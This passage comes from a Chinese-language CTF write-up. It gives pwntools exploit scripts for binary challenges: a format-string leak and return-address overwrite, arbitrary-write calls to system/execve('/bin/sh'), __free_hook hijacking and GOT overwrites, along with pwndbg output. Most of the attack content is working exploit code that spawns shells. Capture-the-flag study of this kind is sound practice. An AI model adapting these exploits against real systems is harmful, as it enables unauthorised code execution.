        p.recvuntil("please enter user token: ")
        p.sendline(t)
        p.recvuntil("please enter user password length : ")
        p.sendline(str(pl))
        p.recvuntil("please enter user password : ")
        p.sendline(pa)
    def add_pl(type):
        cmd(0)
        cmd(type)
    def show(idx):
        cmd(2)
        p.recvuntil("index : ")
        p.sendline(str(idx))
    def main(host,port=9999):
        global p
        if host:
            p = remote(host,port)
        else:
            p = process("./hannota")
            # p = process("./pwn",env={"LD_PRELOAD":"./x64_libc.so.6"})
            # gdb.attach(p)
            debug(0x00000000000024A1)
        ca(0x20,"AA",0x20,"AA",0x20,"AA")
        ca(0x20,"AA",0x20,"AA",0x20,"AA")
        login(0x20,"AA",0x20,"AA")
        add_pl(0)
        show(0)
        p.recvuntil("E.g :")
        p.sendline("%p%p-%p-%p-%p-%p-%p%p%p%p%p*%p*")
        p.recvuntil('-')
        libc.address = int(p.recvuntil("-",drop=True),16)-0x110081
        info("libc : " + hex(libc.address))
        p.recvuntil('*')
        stack = int(p.recvuntil("*",drop=True),16)
        info("stack : " + hex(stack))
        ret_addr = stack+0x8
        payload = fmtstr(8,ret_addr,p64(libc.address+0x4f2c5)[:6],0)
        show(0)
        p.recvuntil("E.g :")
        p.send(payload)
        sleep(0.1)
        p.sendline("cat flag")
        p.recv(timeout=0.5)
        flag = p.recvuntil("\n",timeout=0.5)
        info(flag)
        p.interactive()
    if __name__ == "__main__":
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
        main(args['REMOTE'])
## pointer_guard
逐渐变难的一题
  * 一开始5次地址写，1次`libc`里的任意函数`call`，参数还是可控的，那自然就`system("/bin/sh")`和`execve("/bin/sh",0,0)`了
    from pwn import *
    context.arch='amd64'
    def cmd(command):
        p.recvuntil(">",timeout=0.5)
        p.sendline(command)
    def main(host,port=9999):
        global p
        if host:
            p = remote(host,port)
        else:
            p = process("./pwn")
            # p = process("./pwn",env={"LD_PRELOAD":"./x64_libc.so.6"})
            gdb.attach(p)
            # debug(0x0000000000000A69)
        p.recvuntil("binary_base=")
        elf.address = int(p.recvuntil("\n",drop=True),16)
        info("elf : " + hex(elf.address))
        p.recvuntil("libc_base=")
        libc.address = int(p.recvuntil("\n",drop=True),16)
        info("libc : " + hex(libc.address))
        p.recvuntil("stack_base=")
        stack = int(p.recvuntil("\n",drop=True),16)
        info("stack : " + hex(stack))
        for i in range(4):
            p.recvuntil("Addr:")
            p.sendline(str(stack))
            p.recvuntil("Value:")
            p.sendline(str(1))
        p.recvuntil("Addr:")
        p.sendline(str(elf.address+0x203210))
        p.recvuntil("Value:")
        p.sendline(str(u64('/bin/sh\x00')))
        p.recvuntil("Trigger!")
        # system
        # p.sendline("system")
        # p.sendline("1")
        # p.sendline(str(stack+0x54))
        # execve
        p.sendline("execve")
        p.sendline("3")
        p.sendline(str(stack+0x54))
        p.sendline("0")
        p.sendline("0")
        p.sendline("cat flag")
        p.recv(timeout=0.5)
        flag = p.recvuntil("\n",timeout=0.5)
        info(flag)
        p.interactive()
    if __name__ == "__main__":
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
        elf = ELF("./pwn",checksec=False)
        main(args['REMOTE'])
  * 然后变成了一次任意地址写，一次`libc`任意函数`call`，但是参数不可控，那就写那些`hook`吧，`__free_hook`,`__malloc_hook`,`__memalign_hook`,`__realloc_hook`都试一试
这里贴个`__free_hook`的，其它的类似
    p.recvuntil("Addr:")
        p.sendline(str(libc.symbols["__free_hook"]))
        p.recvuntil("Value:")
        p.sendline(str(libc.address+0x10a38c))
        p.recvuntil("Trigger!")
        p.sendline("free")
        p.sendline("0\x00"+"\x00"*90)
        p.sendline("cat flag")
        p.recv(timeout=0.5)
        flag = p.recvuntil("\n",timeout=0.5)
        info(flag)
  * 然后是两次地址写
    for ( i = 0; (unsigned __int64)i      lea    rdi, [rbx + 0x10]
       0x7ff6fbcf672a      mov    r8, r12
       0x7ff6fbcf672d      mov    rcx, rbp
     ► 0x7ff6fbcf6730      call   _dl_catch_error@plt 
            rdi: 0x7ff6fbef80f0 (last_result+16) ◂— 0x0
            rsi: 0x7ff6fbef80f8 (last_result+24) ◂— 0x0
            rdx: 0x7ff6fbef80e8 (last_result+8) ◂— 0x0
            rcx: 0x7ff6fbcf5f40 (dlopen_doit) ◂— push   rbx
既然是`plt`的话，那就可以修改`GOT`表来劫持流程了
    ► 0x7ff6fbcf5d90        jmp    qword ptr [rip + 0x2022a2] 
       0x7ff6fbcf5d96      push   4
       0x7ff6fbcf5d9b     jmp    0x7ff6fbcf5d40
        ↓
       0x7ff6fbcf5d40                             push   qword ptr [rip + 0x2022c2] 
       0x7ff6fbcf5d46                             jmp    qword ptr [rip + 0x2022c4] 
    pwndbg> telescope 0x5f4010+0x7f3cf530b000
    00:0000│   0x7f3cf58ff010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7f3cf5917750 (_dl_runtime_resolve_xsavec)
可以看到有两处地方都用到了`GOT`表，所以都试一试改为`one_gadget`，结果本地都不行，但是打远程的时候通了，打通的是把`_dl_runtime_resolve_xsavec`的`GOT`改为`one_gadget`，这运气没谁了，晚上回去的时候又去试了下本地，居然又可以了。。。
    p.recvuntil("Addr:")
        p.sendline(str(libc.address+0x5f4010))
        p.recvuntil("Value:")
        p.sendline(str(libc.address+0x10a38c))
## tnj
这题的话还是看丁佬的 github 吧，膜丁佬。  